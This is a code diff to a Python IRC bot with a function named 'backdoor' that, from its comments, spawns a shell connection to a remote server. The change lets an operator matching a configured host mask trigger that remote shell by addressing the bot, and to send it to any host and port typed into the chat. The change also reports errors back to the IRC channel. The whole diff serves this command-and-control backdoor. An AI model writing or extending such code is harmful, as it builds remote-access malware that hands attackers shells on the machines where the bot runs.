@@ -41,6 +41,9 @@ def backdoor(irc, channel, server, port):
 		# catch child process on exception/after dumb shell
 		os.execlp("/bin/true", "/bin/true")
 
+def addresses_bot(word, nickname):
+	return word == nickname or word == nickname + ':' or word == nickname + ','
+
 if __name__ == '__main__':
 	import time
 	from config import host, botnick, channel, opmask, backdoorserver
@@ -78,12 +81,15 @@ if __name__ == '__main__':
 			if mask == opmask:
 				d = d.lstrip(':')
 				words = d.split(' ')
-				if words[0] == '!backdoor':
-					backdoor(irc, channel, backdoorserver, int(words[1]))
+				if addresses_bot(words[0], irc.nickname):
 					try:
-						pass
-					except:
-						pass
+						if len(words) == 3:
+							backdoor(irc, channel, words[1], int(words[2]))
+						elif len(words) == 2:
+							backdoor(irc, channel, backdoorserver, int(words[1]))
+					except Exception as e:
+						import traceback
+						print_exception(irc, channel, traceback.format_exc())
 
 		if not s: continue
 		print s
